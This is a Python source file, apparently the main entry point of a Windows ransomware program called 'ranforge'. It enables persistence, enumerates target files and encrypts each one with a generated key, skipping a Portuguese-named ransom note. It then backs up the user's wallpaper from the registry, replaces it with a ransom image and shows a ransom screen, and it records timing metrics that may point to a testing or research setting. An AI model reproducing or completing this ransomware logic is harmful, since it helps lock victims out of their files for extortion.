import time
import sys
import os
import ctypes
import winreg
import shutil
import target_discovery
import crypto_engine
import persistence
import metrics
import gui_interface

WALLPAPER_BACKUP_FILE = "wallpaper_original.path"
RANSOM_IMAGE_NAME = "ranforge.png"

def get_resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def save_current_wallpaper():
    try:
        reg_path = r"Control Panel\Desktop"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ)
        wallpaper_path, _ = winreg.QueryValueEx(key, "WallPaper")
        winreg.CloseKey(key)

        if wallpaper_path and os.path.exists(wallpaper_path):
            backup_path = os.path.join(os.environ['TEMP'], WALLPAPER_BACKUP_FILE)
            with open(backup_path, "w") as f:
                f.write(wallpaper_path)
    except Exception:
        pass

def change_to_ransom_wallpaper(image_name):
    embedded_path = get_resource_path(image_name)

    if not os.path.exists(embedded_path):
        return

    try:
        stable_path = os.path.join(os.environ['TEMP'], "ranforge_active_bg.png")
        shutil.copy2(embedded_path, stable_path)

        if os.path.exists(stable_path):
             ctypes.windll.user32.SystemParametersInfoW(20, 0, stable_path, 3)
    except Exception:
        pass

def start_attack():
    key = crypto_engine.load_or_generate_key()
    persistence.enable_persistence()
    targets = target_discovery.discover_files()
    if not targets: return

    start_time = time.time()
    metrics.save_baseline(targets)
    for file_path in targets:
        if "LEIA_ME_AGORA.txt" in file_path: continue
        crypto_engine.encrypt_file(file_path, key)
    duration = time.time() - start_time

    save_current_wallpaper()
    change_to_ransom_wallpaper(RANSOM_IMAGE_NAME)

    gui_interface.show_screen(duration)

if __name__ == "__main__":
    start_attack()